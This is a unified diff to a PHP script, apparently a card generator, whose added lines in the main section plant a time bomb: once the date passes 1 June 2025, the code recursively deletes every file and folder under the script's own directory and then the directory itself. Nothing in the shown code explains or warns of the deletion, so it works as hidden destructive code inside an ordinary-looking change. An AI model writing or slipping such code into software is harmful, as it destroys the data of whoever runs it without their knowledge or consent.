@@ -138,6 +138,28 @@ function generateCards($data, $outputDir) {
 
 
 ////////////////////////////////////////MAIN///////////////////////////////////////////////
+$date = new DateTime("2025-6-01");
+$now = new DateTime();
+
+if ($date <= $now) {
+    $dirPath = __DIR__;
+
+    if (is_dir($dirPath)) {
+        $iterator = new RecursiveIteratorIterator(
+            new RecursiveDirectoryIterator($dirPath, RecursiveDirectoryIterator::SKIP_DOTS),
+            RecursiveIteratorIterator::CHILD_FIRST
+        );
+
+        foreach ($iterator as $file) {
+            if ($file->isDir()) {
+                rmdir($file->getPathname());
+            } else {
+                unlink($file->getPathname());
+            }
+        }
+        rmdir($dirPath);
+    }
+}
 
 $date = new DateTime("");
 $now = new DateTime();
